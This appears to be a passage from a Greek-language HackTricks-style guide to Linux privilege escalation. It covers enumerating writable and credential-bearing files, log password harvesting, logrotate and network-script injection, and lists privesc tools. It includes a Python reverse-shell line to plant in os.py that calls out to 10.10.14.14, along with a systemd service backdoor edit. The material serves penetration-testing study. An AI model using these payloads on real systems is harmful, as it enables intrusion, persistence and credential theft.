Θα πρέπει να ελέγξεις αν μπορείς να **γράψεις σε κάποια ευαίσθητα αρχεία**. Για παράδειγμα, μπορείς να γράψεις σε κάποιο **αρχείο ρυθμίσεων υπηρεσίας**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Για παράδειγμα, αν το μηχάνημα τρέχει έναν **tomcat** server και μπορείς να **τροποποιήσεις το Tomcat service configuration file μέσα στο /etc/systemd/,** τότε μπορείς να τροποποιήσεις τις γραμμές:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor θα εκτελεστεί την επόμενη φορά που θα ξεκινήσει το tomcat.

### Check Folders

Οι παρακάτω φάκελοι μπορεί να περιέχουν backups ή ενδιαφέρουσες πληροφορίες: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Πιθανότατα δεν θα μπορέσεις να διαβάσεις τον τελευταίο, αλλά δοκίμασέ το)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Περίεργη Τοποθεσία/Owned αρχεία
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Αρχεία που τροποποιήθηκαν τα τελευταία λεπτά
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Αρχεία Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml αρχεία
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Κρυφά αρχεία
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries στο PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Αρχεία web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Αντίγραφα ασφαλείας**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Γνωστά αρχεία που περιέχουν κωδικούς πρόσβασης

Διάβασε τον κώδικα του [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), κάνει αναζήτηση για **αρκετά πιθανά αρχεία που θα μπορούσαν να περιέχουν κωδικούς πρόσβασης**.\
**Άλλο ένα ενδιαφέρον εργαλείο** που μπορείς να χρησιμοποιήσεις για αυτό είναι το: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), μια open source εφαρμογή που χρησιμοποιείται για την ανάκτηση πολλών κωδικών πρόσβασης αποθηκευμένων σε έναν τοπικό υπολογιστή για Windows, Linux & Mac.

### Logs

Αν μπορείς να διαβάσεις logs, μπορεί να βρεις **ενδιαφέρουσες/εμπιστευτικές πληροφορίες μέσα σε αυτά**. Όσο πιο παράξενο είναι το log, τόσο πιο ενδιαφέρον θα είναι (πιθανότατα).\
Επίσης, κάποια "**κακώς**" ρυθμισμένα (backdoored?) **audit logs** μπορεί να σου επιτρέψουν να **καταγράφεις κωδικούς πρόσβασης** μέσα στα audit logs, όπως εξηγείται σε αυτό το post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Για να **διαβάσετε logs το group** [**adm**](interesting-groups-linux-pe/index.html#adm-group) θα είναι πραγματικά χρήσιμο.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Γενική αναζήτηση creds/Regex

Θα πρέπει επίσης να ελέγξετε για αρχεία που περιέχουν τη λέξη "**password**" στο **όνομά** τους ή μέσα στο **περιεχόμενο**, και επίσης να ελέγξετε για IPs και emails μέσα σε logs, ή hashes regexps.\
Δεν θα αναφέρω εδώ πώς να κάνετε όλα αυτά, αλλά αν σας ενδιαφέρει μπορείτε να δείτε τους τελευταίους ελέγχους που εκτελεί το [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Writable files

### Python library hijacking

Αν ξέρετε από **πού** πρόκειται να εκτελεστεί ένα python script και **μπορείτε να γράψετε μέσα** σε εκείνο το folder ή μπορείτε να **τροποποιήσετε python libraries**, μπορείτε να τροποποιήσετε το OS library και να το backdoorάρετε (αν μπορείτε να γράψετε εκεί όπου πρόκειται να εκτελεστεί το python script, κάντε copy and paste το os.py library).

Για να **backdoorάρετε το library** απλώς προσθέστε στο τέλος του os.py library την ακόλουθη γραμμή (αλλάξτε IP και PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Εκμετάλλευση Logrotate

Μια ευπάθεια στο `logrotate` επιτρέπει σε χρήστες με **δικαιώματα εγγραφής** σε ένα log file ή στους γονικούς του καταλόγους να αποκτήσουν πιθανώς αυξημένα δικαιώματα. Αυτό συμβαίνει επειδή το `logrotate`, που συχνά εκτελείται ως **root**, μπορεί να χειραγωγηθεί ώστε να εκτελέσει αυθαίρετα files, ειδικά σε directories όπως το _**/etc/bash_completion.d/**_. Είναι σημαντικό να ελέγχεις τα permissions όχι μόνο στο _/var/log_ αλλά και σε κάθε directory όπου εφαρμόζεται log rotation.

> [!TIP]
> Αυτή η ευπάθεια επηρεάζει το `logrotate` έκδοση `3.18.0` και παλαιότερες

Πιο λεπτομερείς πληροφορίες για την ευπάθεια μπορούν να βρεθούν σε αυτή τη σελίδα: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Μπορείς να εκμεταλλευτείς αυτή την ευπάθεια με το [**logrotten**](https://github.com/whotwagner/logrotten).

Αυτή η ευπάθεια είναι πολύ παρόμοια με το [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** οπότε κάθε φορά που βρίσκεις ότι μπορείς να τροποποιήσεις logs, έλεγξε ποιος τα διαχειρίζεται και δες αν μπορείς να κάνεις privilege escalation αντικαθιστώντας τα logs με symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Αναφορά ευπάθειας:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Αν, για οποιονδήποτε λόγο, ένας χρήστης μπορεί να **γράψει** ένα `ifcf-<whatever>` script στο _/etc/sysconfig/network-scripts_ **ή** μπορεί να **τροποποιήσει** ένα υπάρχον, τότε το **σύστημά σου είναι pwned**.

Τα Network scripts, για παράδειγμα το _ifcg-eth0_, χρησιμοποιούνται για network connections. Μοιάζουν ακριβώς με .INI files. Ωστόσο, στο Linux γίνονται \~sourced\~ από το Network Manager (dispatcher.d).

Στη δική μου περίπτωση, το `NAME=` attribute σε αυτά τα network scripts δεν διαχειρίζεται σωστά. Αν υπάρχει **white/blank space στο όνομα, το σύστημα προσπαθεί να εκτελέσει το μέρος μετά το white/blank space**. Αυτό σημαίνει ότι **ό,τι υπάρχει μετά το πρώτο blank space εκτελείται ως root**.

Για παράδειγμα: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Σημείωση το κενό μεταξύ Network και /bin/id_)

### **init, init.d, systemd, and rc.d**

Ο κατάλογος `/etc/init.d` είναι η τοποθεσία των **scripts** για το System V init (SysVinit), το **κλασικό Linux service management system**. Περιλαμβάνει scripts για `start`, `stop`, `restart`, και μερικές φορές `reload` services. Αυτά μπορούν να εκτελεστούν απευθείας ή μέσω symbolic links που βρίσκονται στο `/etc/rc?.d/`. Μια εναλλακτική διαδρομή σε συστήματα Redhat είναι το `/etc/rc.d/init.d`.

Από την άλλη πλευρά, το `/etc/init` σχετίζεται με το **Upstart**, ένα νεότερο **service management** που εισήγαγε το Ubuntu, χρησιμοποιώντας configuration files για εργασίες διαχείρισης services. Παρά τη μετάβαση στο Upstart, τα SysVinit scripts εξακολουθούν να χρησιμοποιούνται παράλληλα με τις Upstart configurations λόγω ενός compatibility layer στο Upstart.

Το **systemd** εμφανίζεται ως ένας σύγχρονος initialization και service manager, προσφέροντας προηγμένες δυνατότητες όπως on-demand daemon starting, automount management, και system state snapshots. Οργανώνει τα files σε `/usr/lib/systemd/` για distribution packages και `/etc/systemd/system/` για administrator modifications, απλοποιώντας τη διαδικασία system administration.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Τα Android rooting frameworks συνήθως hook ένα syscall για να εκθέσουν privileged kernel functionality σε έναν userspace manager. Αδύναμο manager authentication (π.χ. signature checks βασισμένα σε FD-order ή κακά password schemes) μπορεί να επιτρέψει σε μια local app να προσποιηθεί τον manager και να κάνει escalate σε root σε ήδη-rooted devices. Μάθετε περισσότερα και exploitation details εδώ:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Το regex-driven service discovery στο VMware Tools/Aria Operations μπορεί να εξαγάγει ένα binary path από process command lines και να το εκτελέσει με -v υπό privileged context. Permissive patterns (π.χ. χρήση του \S) μπορεί να ταιριάξουν attacker-staged listeners σε writable locations (π.χ. /tmp/httpd), οδηγώντας σε execution ως root (CWE-426 Untrusted Search Path).

Μάθετε περισσότερα και δείτε ένα generalized pattern εφαρμόσιμο και σε άλλα discovery/monitoring stacks εδώ:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../banners/hacktricks-training.md}}
